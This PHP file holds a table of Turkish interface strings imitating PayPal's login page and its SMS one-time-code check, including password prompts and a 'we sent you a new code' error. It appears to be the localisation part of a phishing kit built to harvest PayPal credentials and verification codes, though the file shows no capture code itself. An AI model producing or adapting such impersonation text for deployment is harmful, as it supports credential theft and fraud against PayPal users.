<?php

function lang($phrase){
    static $lang = array(
        '1' => 'PayPal hesabınıza giriş yapın',
        '2' => 'E-posta veya mobil numara',
        '3' => 'Parola',
        '4' => 'Parolayı mı unuttunuz?',
        '5' => 'Giriş Yap',
        '6' => 'veya',
        '7' => 'Üye Ol',
        '8' => 'İngilizce',
        '9' => 'Fransızca',
        '10' => 'İspanyolca',
        '11' => '文',
        '12' => 'Hızlı güvenlik kontrolü',
        '13' => 'Sadece siz olduğunuzu doğrulamak için ek bilgilere ihtiyacımız var.',
        '14' => 'Bir metin al',
        '15' => 'Devam ederek, bu telefon numarasını kullanma yetkiniz olduğunu ve kimliğinizi bu oturumda doğrulamak için metin mesajları almayı kabul ettiğinizi onaylarsınız. Operatör ücretleri uygulanabilir. Kablosuz operatörünüzden abone ve cihaz bilgilerini risk ve dolandırıcılık amaçları için alabiliriz.',
        '16' => 'İleri',
        '17' => 'Kodunuzu girin.',
        '18' => 'Yeniden gönder',
        '19' => 'Devam',
        '20' => 'Bizimle iletişime geçin',
        '21' => 'Gizlilik',
        '22' => 'Hukuki',
        '23' => 'Politika Güncellemeleri',
        '24' => 'Dünya çapında',
        '25' => 'Geçersiz kod. Size yeni bir kod gönderdik.',
    );

    return $lang[$phrase];
}
?>
